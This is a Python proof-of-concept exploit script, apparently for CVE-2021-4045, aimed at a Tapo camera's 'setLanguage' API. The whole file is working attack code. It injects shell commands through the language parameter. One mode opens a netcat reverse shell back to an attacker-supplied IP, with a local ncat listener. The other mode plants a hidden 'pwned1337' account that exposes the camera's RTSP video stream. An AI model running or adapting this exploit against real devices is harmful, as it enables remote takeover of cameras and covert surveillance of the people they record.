import requests, urllib3, sys, threading, os, hashlib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PORT = 1337
REVERSE_SHELL = 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f'
NC_COMMAND = 'ncat -lv %d' % PORT

RTSP_USER = 'pwned1337'
RTSP_PASSWORD = 'pwned1337'
RTSP_CIPHERTEXT = 'RUW5pUYSBm4gt+5T7bzwEq5r078rcdhSvpJrmtqAKE2mRo8bvvOLfYGnr5GNHfANBeFNEHhucnsK86WJTs4xLEZMbxUS73gPMTYRsEBV4EaKt2f5h+BkSbuh0WcJTHl5FWMbwikslj6qwTX48HasSiEmotK+v1N3NLokHCxtU0k='

print("""
  CVE-2021-4045 PoC  _   @hacefresko                 
 _ ____      ___ __ | |_ __ _ _ __   ___  
| '_ \ \ /\ / / '_ \| __/ _` | '_ \ / _ \ 
| |_) \ V  V /| | | | || (_| | |_) | (_) |
| .__/ \_/\_/ |_| |_|\__\__,_| .__/ \___/ 
|_|                          |_|          
""")

if (len(sys.argv) < 4) or (sys.argv[1] != 'shell' and sys.argv[1] != 'rtsp'):
    print("[x] Usage: python3 pwnTapo.py [shell|rtsp] [victim_ip] [attacker_ip]")
    print()
    exit()

victim = sys.argv[2]
attacker = sys.argv[3]
url = "https://" + victim + ":443/"

if sys.argv[1] == 'shell':
    print("[+] Listening on port %d..." % PORT)
    t = threading.Thread(target=os.system, args=(NC_COMMAND,))
    t.start()

    print("[+] Sending reverse shell to %s...\n" % victim)
    json = {"method": "setLanguage", "params": {"payload": "';" + REVERSE_SHELL % (attacker, PORT) + ";'"}}
    requests.post(url, json=json, verify=False)

elif sys.argv[1] == 'rtsp':
    print("[+] Setting up RTSP video stream...")
    md5_rtsp_password = hashlib.md5(RTSP_PASSWORD.encode()).hexdigest().upper()
    json = {"method": "setLanguage", "params": {"payload": "';uci set user_management.third_account.username=%s;uci set user_management.third_account.passwd=%s;uci set user_management.third_account.ciphertext=%s;uci commit user_management;/etc/init.d/cet terminate;/etc/init.d/cet resume;'" % (RTSP_USER, md5_rtsp_password, RTSP_CIPHERTEXT)}}
    requests.post(url, json=json, verify=False)

    print("[+] RTSP video stream available at rtsp://%s/stream2" % victim)
    print("[+] RTSP username: %s" % RTSP_USER)
    print("[+] RTSP password: %s" % RTSP_PASSWORD)